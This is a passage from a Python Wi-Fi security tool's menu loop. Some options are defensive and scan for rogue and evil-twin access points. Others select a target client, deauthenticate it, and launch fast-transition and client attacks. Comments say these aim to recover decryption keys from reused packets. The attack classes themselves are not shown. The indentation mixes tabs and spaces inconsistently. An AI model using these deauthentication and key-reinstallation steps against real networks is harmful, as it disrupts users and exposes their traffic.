			print_clients(bssid, essid, channel)
			target_client = select_client()
			deauth_client(target_client,wlanXmon,bssid)
			continue
		########### Check rogue AP with same SSID and different MAC	
	    	if main_option == 4:
			clear_screen()
			makeScan(wlanXmon)
			whitelist [:] = []
			whitelist_client()
			print_whitelist()
			find_rouge_ap()
			continue
		########### Check EVIL TWIN AP with same SSID and MAC and different other attributes 
		if main_option == 5:
			clear_screen()
			makeScan(wlanXmon)
			whitelist [:] = []
			whitelist_client()
			print_whitelist()
			find_evil_twin()
			continue			
		if main_option == 6:
			clear_screen()
			#makeScan(wlanXmon) #uncomment this!
			print_stations()
			station = select_station()
			bssid, essid, channel = rescan_with_station(station,wlanXmon,selectedInterface) #Select Target Roaming 
			print_clients(bssid, essid, channel)
			tar_client = select_client()
			tar_mac= get_Target_Mac(tar_client) #Select Target Client
			monitor_channel(channel,wlanXmon,selectedInterface)
			attackFT = FT(selectedInterface, wlanXmon, tar_mac) #Start Attack 
			attackFT.run()
			makeMonitor(selectedInterface)
			#MAKE SOME MAGIC AND GET THE DECRYPTION KEY FROM REUSED PACKETS
			continue
	    	if main_option == 7:
			clear_screen()
			#makeScan(wlanXmon) #uncomment this!
			print_stations()
			station = select_station()
			bssid, essid, channel = rescan_with_station(station,wlanXmon,selectedInterface) # Select Target Access Point 
			print_clients(bssid, essid, channel)
			tar_client = select_client()   # Select Target client 
			tar_mac= get_Target_Mac(tar_client)
			monitor_channel(channel,wlanXmon,selectedInterface)
			maininterface_channel(channel,selectedInterface)
			deauth_client(tar_mac,wlanXmon,bssid) # Deauthenticate Targets
			attackAT = AttackClient(selectedInterface, wlanXmon, tar_mac, bssid)	
			attackAT.run() # Start Attack
			#MAKE SOME MAGIC AND GET THE DECRYPTION KEY FROM REUSED PACKETS
			maininterface_reset(selectedInterface)
			makeMonitor(selectedInterface)			
			continue
	    	if main_option == 0:
			print("Goodbye!")
			stop_ifExist()
			sys.exit(1)
#----------main method-------------------------------------------
if __name__ == "__main__":
	main()
    

